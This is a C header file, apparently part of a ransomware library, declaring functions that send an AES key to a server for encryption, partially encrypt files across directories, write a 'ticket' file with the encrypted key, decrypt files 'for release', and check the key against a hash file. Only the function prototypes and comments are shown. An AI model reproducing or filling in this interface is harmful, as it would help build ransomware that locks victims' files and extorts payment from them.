/*
	Contains higher-level cryptographical functions
	(as opposed to crypt.h)
*/
#ifndef RANSOMLIB_HEADER
#    define RANSOMLIB_HEADER 1
#    include <stdbool.h>
#    include <stdint.h>
//Connect to server to encrypt AES key
int encryptSymmetricKey(char **encrypted_key, const int pubkeyid,
			const char *key);

//Encrypt first x bytes of file
bool partialEncryptFile(const char *keyiv, const char *filename,
			int64_t number_of_bytes, bool decrypt);

//Run partialEncryptFile through a directory
bool encryptDirectory(const char *keyiv, const char *directory);

//For release
bool decryptDirectory(const char *keyiv, const char *directory);

//Make a "ticket" file, with encrypted key
bool makeTicketFile(const char *keyiv, const char *directory);

//Make a 16-bit hash file
bool makeHashFile(const char *keyiv, const char *directory);

//Check keyiv by hashing it and comparing against existing hash file(made with makeHashFile)
bool checkKeyivIntegrity(const char *keyiv, const char *directory);
#endif
